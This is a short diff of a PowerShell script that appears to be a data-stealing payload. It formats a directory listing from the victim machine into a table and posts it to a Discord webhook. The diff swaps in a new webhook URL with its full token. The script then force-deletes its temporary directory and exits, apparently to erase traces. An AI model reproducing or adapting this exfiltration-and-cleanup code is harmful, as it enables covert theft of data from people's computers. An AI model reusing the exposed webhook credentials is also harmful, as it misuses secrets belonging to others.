@@ -17,7 +17,7 @@ $r = Get-ChildItem | ForEach-Object {
 $body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}
 
 # Send the formatted table to a Discord webhook
-Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1329215677944565871/f1I5jRL0Bae6POO9VU0rDKCvPoWY2X2UBgSHhHJPQm-yUjtxFdw_TQFRHcQ7A-dUDGAW' -Method 'post' -Body $body >$null;
+Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1464042268062126192/bM0DHsu6iZpS2CtzN6GBEJ2PEMLNk1muv1Mohan6zQ90XRRwKuRdU8IPrIdv8cbVhUdR' -Method 'post' -Body $body >$null;
 
 # Delete the temporary directory and exit the script
 cd ..; rm $p -r -fo; exit;
